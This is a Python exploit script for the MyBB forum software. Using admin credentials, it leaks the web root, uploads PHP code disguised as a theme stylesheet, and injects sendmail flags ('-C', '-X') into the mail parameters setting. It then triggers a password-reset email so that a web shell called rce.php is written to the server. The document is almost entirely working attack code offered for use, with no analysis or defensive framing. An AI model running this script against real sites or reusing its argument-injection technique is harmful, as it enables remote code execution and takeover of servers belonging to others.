import requests
import argparse
import random
import string
from base64 import b64decode
from bs4 import BeautifulSoup

proxies = {
   'http': 'http://127.0.0.1:8080',
}

def login(username, password):

    data = {
        "username" : username,
        "password" : password,
        "do" : "login"
    }

    login_txt = r_client.post(host + "/admin/index.php", data=data).text

    if "The username and password combination you entered is invalid" in login_txt:
        print("[-] Login failure. Incorrect credentials supplied")
        exit(0)

    print("[+] Login successful!")

def leak_web_root():
    phpinfo  = r_client.get(host + "/admin/index.php?module=tools-php_info&action=phpinfo").text
    p = phpinfo.find('<tr><td class="e">CONTEXT_DOCUMENT_ROOT </td><td class="v">')
    p += 59
    phpinfo = phpinfo[p:]

    return phpinfo[:phpinfo.find(' </td></tr>')]

def add_settings(web_root,shell):

    config_settings_txt = r_client.get(host + "/admin/index.php?module=config-settings&action=change&gid=24").text

    if "Access Denied" in config_settings_txt:
        print("[-] Supplied user doesn't have the rights to add a setting")
        exit(0)

    print("[*] Stage 2...")

    soup = BeautifulSoup(config_settings_txt, "lxml")
    my_post_key = soup.find_all("input", {"name" : "my_post_key"})[0]['value']

    rand_string = get_rand_string()

    data = {
        "my_post_key" : my_post_key,
        "gid":24,
        "upsetting[TEST]":"TEST",
        "upsetting[mail_handler]":"mail",
        "upsetting[mail_parameters]":"-f lol@lol.com -C {}/cache/themes/theme2/{}.css -X {}/rce.php".format(web_root,shell,web_root),
        "upsetting[mail_logging]":2,
        "upsetting[mail_message_id]":1,
        "upsetting[mail_queue_limit]":10

    }

    post_setting = r_client.post(host + "/admin/index.php?module=config-settings&action=change",data=data,allow_redirects=False,proxies=proxies)

    if post_setting.status_code != 302:
        soup = BeautifulSoup(post_setting.text, "lxml")
        error_txt = soup.find_all("div", {"class" : "error"})[0].text
        print("[-] Exploit didn't work. Reason: '{}'".format(error_txt))
        exit(0)

    print("[+] Stage 2 successfully completed!")
    return rand_string

def add_shell(code):

    config_settings_txt = r_client.get(host + "/admin/index.php?module=style-themes&action=add_stylesheet&tid=2").text


    print("[*] Stage 1...")

    soup = BeautifulSoup(config_settings_txt, "lxml")
    my_post_key = soup.find_all("input", {"name" : "my_post_key"})[0]['value']

    rand_string = get_rand_string()

    data = {
        "my_post_key" : my_post_key,
        "tid":2,
        "sid":"",
        "name":rand_string+".css",
        "attach":0,
        "import":"color_black.css",
        "add_type":2,
        "stylesheet":"<?php {}; ?>".format(code)

    }

    post_setting = r_client.post(host + "/admin/index.php?module=style-themes&action=add_stylesheet",data=data,allow_redirects=False,proxies=proxies)

    if post_setting.status_code != 302:
        soup = BeautifulSoup(post_setting.text, "lxml")
        error_txt = soup.find_all("div", {"class" : "error"})[0].text
        print("[-] Exploit didn't work. Reason: '{}'".format(error_txt))
        exit(0)

    print("[+] Stage 1 successfully completed!")
    return rand_string

def trigger(email):
    print("[*] Stage 3...")

    data = {
        "email":email,
        "submit":"Request+Login+Credentials",
        "action":"do_lostpw"
    }
    try :
        requests.post(host+"/member.php",data=data)
    except :
        pass

    print("[+] Stage 3 successfully completed!")
    print("[+] Web Shell : " + host + "/rce.php")

def get_rand_string(length=8):
    
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

parser = argparse.ArgumentParser()

parser.add_argument('--username', required=True, help="MyBB Admin CP username")
parser.add_argument('--email', required=True, help="MyBB Admin CP email")
parser.add_argument('--password', required=True, help="MyBB Admin CP password")
parser.add_argument('--host', required=True, help="e.g. http://target.website.local, http://10.10.10.10, http://192.168.23.101:8000")
parser.add_argument('--cmd', required=True, help="PHP code to run")

args = parser.parse_args()

username = args.username
password = args.password
host = args.host
email = args.email
cmd = args.cmd

r_client = requests.Session()

login(username, password)
print("[+] Leaking Web root path")
web_root = leak_web_root()
print("[+] Web root path : " + web_root)
shell = add_shell(cmd)
add_settings(web_root,shell)
trigger(email)
